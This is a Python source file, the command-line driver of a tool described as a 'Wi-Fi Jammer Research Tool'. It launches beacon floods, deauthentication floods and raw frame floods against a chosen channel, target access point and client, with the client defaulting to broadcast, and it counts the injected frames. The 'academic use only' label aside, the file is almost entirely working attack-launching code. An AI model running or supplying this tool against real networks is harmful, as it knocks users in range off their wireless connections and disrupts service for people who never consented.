import argparse, time, sys
from core.interface import detect_adapters
from core.monitor import enable_monitor, disable_monitor
from core.scanner import scan
from core.channel import lock_channel
from attacks.beacon import beacon_flood
from attacks.deauth import deauth_flood
from attacks.flood import frame_flood

MODES = ["beacon", "deauth", "flood", "scan"]

def parse_args():
    p = argparse.ArgumentParser(
        description="S007 — Wi-Fi Jammer Research Tool (Academic Use Only)")
    p.add_argument("--iface",    required=True,  help="Wireless interface (e.g. wlan1)")
    p.add_argument("--mode",     required=True,  choices=MODES)
    p.add_argument("--channel",  type=int,       default=6)
    p.add_argument("--bssid",    default=None,   help="Target AP BSSID (deauth mode)")
    p.add_argument("--client",   default="ff:ff:ff:ff:ff:ff", help="Target client MAC")
    p.add_argument("--rate",     type=int,       default=500,  help="Frames per second")
    p.add_argument("--duration", type=int,       default=60,   help="Attack duration (s)")
    return p.parse_args()

def main():
    args = parse_args()
    mon_iface = enable_monitor(args.iface)
    try:
        if args.mode == "scan":
            results = scan(mon_iface, timeout=args.duration)
            print(f"\n[*] Found {len(results)} access points.")
            return
        lock_channel(mon_iface, args.channel)
        counter = [0]
        if args.mode == "beacon":
            stop, counter = beacon_flood(mon_iface, args.channel,
                                         rate=args.rate, duration=args.duration,
                                         counter=counter)
        elif args.mode == "deauth":
            if not args.bssid:
                sys.exit("[-] --bssid required for deauth mode")
            stop, counter = deauth_flood(mon_iface, args.bssid,
                                         client_mac=args.client,
                                         rate=args.rate, duration=args.duration,
                                         counter=counter)
        elif args.mode == "flood":
            stop, counter = frame_flood(mon_iface, duration=args.duration,
                                        rate=args.rate, counter=counter)
        start = time.time()
        while time.time() - start < args.duration:
            elapsed = time.time() - start
            print(f"\r[*] Elapsed: {elapsed:.0f}s | Frames sent: {counter[0]:,}", end="")
            time.sleep(1)
        stop.set()
        print(f"\n[+] Attack complete. Total frames injected: {counter[0]:,}")
    finally:
        disable_monitor(mon_iface)

if __name__ == "__main__":
    main()
